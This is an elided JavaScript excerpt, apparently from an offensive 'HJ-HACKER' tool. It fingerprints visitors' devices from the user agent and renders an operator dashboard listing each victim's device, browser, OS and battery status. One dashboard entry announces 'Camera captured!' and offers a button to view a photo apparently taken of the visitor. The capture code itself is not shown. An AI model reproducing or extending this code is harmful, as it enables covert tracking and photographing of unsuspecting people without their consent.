...
async function getAdvancedDeviceInfo() {
    ...
    if (ua.includes('iPhone')) info.device_model = 'iPhone';
    else if (ua.includes('iPad')) info.device_model = 'iPad';
    ...
    } else if (ua.includes('Windows')) info.device_model = 'Windows PC';
    else if (ua.includes('Mac')) info.device_model = 'Mac';
    else info.device_model = 'Unknown';
    ...
    try {
        ...
        const html = recent.map(v => `
            <div class="data-item">
                ...
                <div class="data-item-stats">
                    <span><i class="fas fa-mobile-alt"></i> ${v.device_brand ? v.device_brand + ' ' : ''}${v.device_model || v.os || 'Unknown Device'}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-chrome"></i> ${v.browser || 'Unknown Browser'}</span>
                    ${v.battery ? `<span><i class="fas fa-battery-full"></i> Battery: ${v.battery} ${v.battery_charging === true ? '<i class="fas fa-bolt"></i> Charging' : ''}</span>` : ''}
        ...
        if (analytics.length === 0) {
            ...
            html += analytics.map(v => `
                <div class="data-item">
                    ...
                    <div class="data-item-stats"><strong><i class="fas fa-chrome"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong><i class="fab fa-windows"></i> OS:</strong> ${v.os || 'Unknown'}</div>
                    ...
                    ${v.captured_image ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Camera captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image}')"><i class="fas fa-eye"></i> View Photo</button></div>` : ''}
                </div>
            `).join('');
        }
...
console.log('🔥 HJ-HACKER Advanced Loaded with Full Device Info!');
